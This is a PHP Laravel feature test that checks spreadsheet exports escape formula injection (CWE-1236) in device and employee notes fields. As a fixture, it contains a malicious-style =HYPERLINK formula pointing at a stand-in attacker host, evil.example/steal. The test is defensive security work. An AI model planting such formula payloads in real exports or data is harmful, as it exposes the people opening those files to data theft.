<?php

namespace Tests\Feature;

use App\Exports\DevicesExport;
use App\Exports\EmployeesExport;
use App\Models\Device;
use App\Models\DeviceCategory;
use App\Models\Employee;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Maatwebsite\Excel\Excel as ExcelWriterType;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * Regresión del Hallazgo Alto H1: CSV/XLSX Formula Injection (CWE-1236).
 * Antes de esta corrección, ningún export escapaba valores de texto libre,
 * así que un campo como "notes" con un valor que empieza en "=" se
 * clasificaba como fórmula por PhpSpreadsheet y se ejecutaba al abrir el
 * archivo en Excel. Este test genera un .xlsx real y lee la celda con
 * PhpSpreadsheet para confirmar que quedó como texto literal, no fórmula.
 */
class ExportFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    protected function readFirstDataRowNotesCell(string $binary, int $notesColumnIndex)
    {
        $tmpFile = tempnam(sys_get_temp_dir(), 'xlsx_test_').'.xlsx';
        file_put_contents($tmpFile, $binary);

        $spreadsheet = IOFactory::load($tmpFile);
        $sheet = $spreadsheet->getActiveSheet();
        $cell = $sheet->getCellByColumnAndRow($notesColumnIndex, 2); // fila 1 = encabezados

        $result = [
            'dataType' => $cell->getDataType(),
            'value' => $cell->getValue(),
        ];

        unlink($tmpFile);

        return $result;
    }

    public function test_device_notes_starting_with_equals_is_not_stored_as_a_formula(): void
    {
        $category = DeviceCategory::where('slug', 'desktop')->firstOrFail();
        Device::factory()->disponible()->create([
            'device_category_id' => $category->id,
            'device_model_id' => null,
            'notes' => '=HYPERLINK("http://evil.example/steal","Click")',
        ]);

        $binary = Excel::raw(new DevicesExport, ExcelWriterType::XLSX);

        // "Notas" es la columna 26 (1-based) en DevicesExport::headings().
        $cell = $this->readFirstDataRowNotesCell($binary, 26);

        // El tipo debe ser texto explícito (nunca "f" de fórmula), y el
        // valor lleva la comilla de escape que antepone bindValue(): en
        // Excel esa comilla no se muestra en la celda (solo en la barra de
        // fórmulas), pero sí confirma que el valor nunca se evalúa.
        $this->assertSame(DataType::TYPE_STRING, $cell['dataType']);
        $this->assertSame('\'=HYPERLINK("http://evil.example/steal","Click")', $cell['value']);
    }

    public function test_employee_notes_starting_with_at_sign_is_not_stored_as_a_formula(): void
    {
        Employee::factory()->activo()->create([
            'notes' => '@SUM(1,2,3)',
        ]);

        $binary = Excel::raw(new EmployeesExport, ExcelWriterType::XLSX);

        // "Notas" es la columna 10 (1-based) en EmployeesExport::headings().
        $cell = $this->readFirstDataRowNotesCell($binary, 10);

        $this->assertSame(DataType::TYPE_STRING, $cell['dataType']);
        $this->assertSame("'@SUM(1,2,3)", $cell['value']);
    }
}
